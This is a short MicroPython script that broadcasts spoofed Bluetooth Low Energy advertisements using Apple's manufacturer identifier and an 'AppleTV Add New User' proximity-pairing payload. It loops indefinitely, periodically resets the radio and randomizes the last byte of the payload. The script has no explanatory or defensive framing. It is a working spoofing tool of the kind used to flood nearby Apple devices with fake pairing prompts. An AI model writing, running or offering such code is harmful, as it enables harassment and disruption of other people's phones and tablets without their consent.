import bluetooth
import time
import random

def advertise():
    print("Starting AppleTV Add New User advertising")
    ble.gap_advertise(interval, adv_data=bt_data)

# Initialize BLE
ble = bluetooth.BLE()
ble.active(True)

# Parameters
interval = 200

# Create advertising payload
bt_data = bytes([0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00])

# Counter for BLE reset
ble_reset_counter = 0
ble_reset_threshold = 10

# Main Loop
while True:
    if ble_reset_counter >= ble_reset_threshold:
        # Stop and restart BLE
        print("Resetting BLE...")
        ble.active(False)
        time.sleep(1)
        ble.active(True)
        
        # Convert bt_data to a list
        bt_data_list = list(bt_data)
        
        # Change the payload slightly (for example, changing one byte)
        bt_data_list[-1] = random.randint(0, 255)
        
        # Convert the list back to bytes
        bt_data = bytes(bt_data_list)
        
        ble_reset_counter = 0

    advertise()
    time.sleep(2)
    ble_reset_counter += 1
